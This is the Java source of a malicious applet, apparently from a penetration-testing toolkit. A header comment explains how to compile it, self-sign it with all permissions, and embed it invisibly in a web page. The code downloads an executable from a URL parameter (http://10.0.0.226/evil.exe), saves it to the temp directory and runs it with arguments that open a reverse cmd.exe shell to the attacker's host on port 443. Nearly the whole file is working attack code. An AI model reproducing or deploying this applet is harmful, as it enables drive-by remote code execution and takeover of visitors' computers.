import java.applet.*;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.util.*;
import java.net.URL;

/**
*	Author: Offensive Security
*	This Java applet will download a file and execute it.
*
*	To use:
*	javac file.java
*	echo "Permissions: all-permissions" > root/manifest.txt
*	jar cvfm Java.jar /root/manifest.txt Java.class
*	keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123
*	jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedJava.jar Java.jar signaplet
*
*	Lastly, embed the applet into a html page
*	cp Java.class SignedJava.jar /var/www/html
*	echo '>applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1"> value="http://10.0.0.226/evil.exe"></applet' > /var/www/java/html
*
*
*
**/

public class Java extends Applet {

	private Object initialized = null;
	public Object isInitialized()
	{
		return initialized;
	}
	public void init() {
	Process f;
	try {
	String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;
	String expath = tmpdir + "evil.exe";
	String download = "";
	download = getParameter("1");
	if (download.length() > 0) {
		// URL parameter
		URL url = new URL(download);
		// Get an input stream for reading
		InputStream in = url.openStream();
		// Create a buffered input stream for efficency
		BufferedInputStream bufIn = new BufferedInputStream(in);
		 File outputFile = new File(expath);
		 OutputStream out = new BufferedOutputStream(new FileOutputStream(outputFile));
		 byte[] buffer = new byte[2048];
		for (;;) {
		 int nBytes = bufIn.read(buffer);
			if (nBytes <= 0) break;
			  out.write(buffer, 0, nBytes);
			   }
			   out.flush();
		 out.close();
			   in.close();
			   f = Runtime.getRuntime().exec("cmd.exe /c " + expath +" 10.0.0.226 443 -e cmd.exe");
		 }

	} catch(IOException e) {
	    e.printStackTrace();
	}
	/* ended here and commented out below for bypass */
	catch (Exception exception)
	{
		exception.printStackTrace();
	}
}
}
